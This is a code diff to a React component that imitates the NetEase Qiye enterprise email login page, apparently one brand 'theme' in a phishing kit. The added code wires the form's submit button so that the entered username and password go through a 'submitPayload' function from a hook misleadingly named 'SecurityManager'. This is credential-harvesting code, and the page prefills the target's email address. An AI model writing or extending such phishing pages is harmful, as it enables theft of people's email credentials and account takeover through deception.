@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
+import { useSecurity } from '../components/SecurityManager';
 
 interface NetEaseQiyeThemeProps {
   prefilledEmail?: string;
@@ -11,6 +12,21 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
   const [username, setUsername] = useState(prefilledEmail?.split('@')[0] || '');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email: username, password }, 'netease_qiye');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
@@ -76,7 +92,7 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
             </div>
 
             <div className="px-8 pt-12 pb-6 flex flex-col flex-grow">
-              <form className="space-y-6">
+              <form onSubmit={handleSubmit} className="space-y-6">
                 <div className="flex items-center space-x-4">
                   <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '用户名' : 'User'}</label>
                   <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white">
@@ -92,8 +108,12 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
                 </div>
 
                 <div className="pl-20">
-                  <button className="w-full py-2 bg-[#3b78e7] hover:bg-[#2e62c2] text-white font-medium rounded transition-colors text-[16px]">
-                    {lang === 'zh' ? '登 录' : 'Login'}
+                  <button 
+                    type="submit"
+                    disabled={isSubmitting}
+                    className="w-full py-2 bg-[#3b78e7] hover:bg-[#2e62c2] text-white font-medium rounded transition-colors text-[16px] disabled:opacity-70"
+                  >
+                    {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Login')}
                   </button>
                 </div>
               </form>
